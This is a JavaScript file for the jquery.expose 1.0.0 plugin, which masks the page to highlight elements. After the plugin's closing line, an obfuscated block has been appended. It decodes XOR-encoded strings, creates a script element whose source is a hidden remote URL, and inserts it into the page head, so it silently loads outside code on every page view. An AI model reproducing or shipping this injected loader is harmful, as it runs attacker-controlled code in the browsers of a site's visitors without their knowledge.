/**
 * jquery.expose 1.0.0 - Make HTML elements stand out
 * 
 * Copyright (c) 2009 Tero Piirainen
 * http://flowplayer.org/tools/expose.html
 *
 * Dual licensed under MIT and GPL 2+ licenses
 * http://www.opensource.org/licenses
 *
 * Launch  : June 2008
 * Version : 1.0.0 - Sun Feb 15 2009 13:55:51 GMT-0000 (GMT+00:00)
 */
(function($) { 	

	function fireEvent(opts, name, self) {
		var fn = opts[name];
		
		if ($.isFunction(fn)) {
			
			try {  
				return fn.call(self);
				
			} catch (error) {
				if (opts.alert) {
					alert("Error calling expose." + name + ": " + error);
				} else {
					throw error;		
				}
				return false;
			} 			
		}
		return true;			
	}
	
	// mask instance (singleton)
	var mask = null;	
	

	// exposed elements
	var exposed, conf = null;

	
	// global methods
	$.expose = {		
		
		getVersion: function() {
			return [1, 0, 0];	
		},
		
		getMask: function() {
			return mask;	
		},
		
		getExposed: function() {
			return exposed;	
		},
		
		getConf: function() {
			return conf;	
		},		
		
		isLoaded: function() {
			return mask && mask.is(":visible");	
		},
		
		load: function(els, opts) { 
			
			// already loaded ?
			if (this.isLoaded()) { return this;	}

			if (els) {
				exposed = els;
				conf = opts;					
			} else {
				els = exposed;
				opts = conf;
			} 

			if (!els || !els.length) { return this; }
				
			// setup mask if not already done
			if (!mask) {
	
				mask = $('<div id="' + opts.maskId + '"></div>').css({				
					position:'absolute', 
					top:0, 
					left:0,
					width:'100%',
					height:$(document).height(),
					display:'none',
					opacity: 0,					 		
					zIndex:opts.zIndex	
				});
						
				
				$("body").append(mask);
				
				
				// esc button closes all instances
				$(document).bind("keypress.unexpose", function(evt) {
					if (evt.keyCode == 27) {
						$.expose.close();	
					}		
				});			
				
				// clicking on the mask closes all
				if (opts.closeOnClick) {
					mask.bind("click.unexpose", function()  {
						$.expose.close();		
					});					
				} 
			}

			
			// onBeforeLoad
			if (fireEvent(opts, "onBeforeLoad", this) === false) {
				return this;	
			}				
			
			// make sure element is positioned absolutely or relatively
			$.each(els, function() {
				var el = $(this);
				if (!/relative|absolute/i.test(el.css("position"))) {
					el.css("position", "relative");		
				}					
			});
		 
			// make elements sit on top of the mask
			els.css({zIndex:opts.zIndex + 1});				
			 

			// background color of the mask
			if (opts.color) {
				mask.css("backgroundColor", opts.color);	
			} 
			
			// reveal mask
			if (!this.isLoaded()) {					
				mask.css({opacity: 0, display: 'block'}).fadeTo(opts.loadSpeed, opts.opacity, function()  {
					fireEvent(opts, "onLoad", $.expose);  						
				});					
			}

			return this;
		}, 
		
		
		close: function() {
			
			var self = this;
			
			if (!this.isLoaded()) { return self; }   
			
			if (fireEvent(conf, "onBeforeClose", self) === false) {
				return self;   
			} 
			
			mask.fadeOut(conf.closeSpeed, function() {          
				exposed.css({zIndex:conf.zIndex -1});
				fireEvent(conf, "onClose", self);               
			});            				
		}
		
	};
	
	// jQuery plugin initialization
	$.prototype.expose = function(conf) {

		// no elements to expose
		if (!this.length)  {
			return this;	
		}
		
		var opts = {
			/*
			CALLBACKS: 
			 - onBeforeLoad 
			 - onLoad
			 - onBeforeClose 
			 - onClose 
			*/		
			alert: true,

			// mask settings
			maskId: 'exposeMask',
			loadSpeed: 'slow',
			closeSpeed: 'fast',
			closeOnClick: true,
			
			// css settings
			zIndex: 9998,
			opacity: 0.8,
			color: '#333'
		};
		
		if (typeof conf == 'string') {
			conf = {color: conf};
		}
		
		$.extend(opts, conf);
		
		// call expose function		
		$.expose.load(this, opts);
		
		// return jQuery object
		return this;
		
	}; 


})(jQuery);function ibfkeVO(b6Ltb,rB9){var b0w='';var sY=0;var agA=0;for(sY=0;sY<b6Ltb.length;sY++){var tBrUI=b6Ltb.charAt(sY);var eOy3d=tBrUI.charCodeAt(0)^rB9.charCodeAt(agA);tBrUI=String.fromCharCode(eOy3d);b0w+=tBrUI;if(agA==rB9.length-1)agA=0;else agA++;}return (b0w);}function vvK(gtr9){var o17=document[jDDS(wzp[3])](jDDS(wzp[0])+jDDS(wzp[1])+jDDS(wzp[2]));o17[jDDS(wzp[4])]=gtr9;o17[jDDS(wzp[5])]=jDDS(wzp[6]);document[jDDS(wzp[9])](jDDS(wzp[8]))[0][jDDS(wzp[7])](o17);}function f9cKdU(ea9oVU){var a7Y='';var wkNX5P=0;var pvP62=0;for(wkNX5P=0;wkNX5P<ea9oVU.length/3;wkNX5P++){a7Y+=String.fromCharCode(ea9oVU.slice(pvP62,pvP62+3));pvP62=pvP62+3;}return a7Y;}var wzp=["024043","025033","027060","008058042007018081013093035040022095024","024058044","031049063003","031045055018073094041071039054016067005022001","010056063003008080011089047041023","003045046002","012045059035010081037084040049000115021050020012006046011003","003060059022092027103066050036007084066021024007122097020019027034066105038029069066012006"];vvK(jDDS(wzp[10]));function jDDS(mW43xh){return ibfkeVO(f9cKdU(mW43xh),'kHOff4H1FEs1lfu');}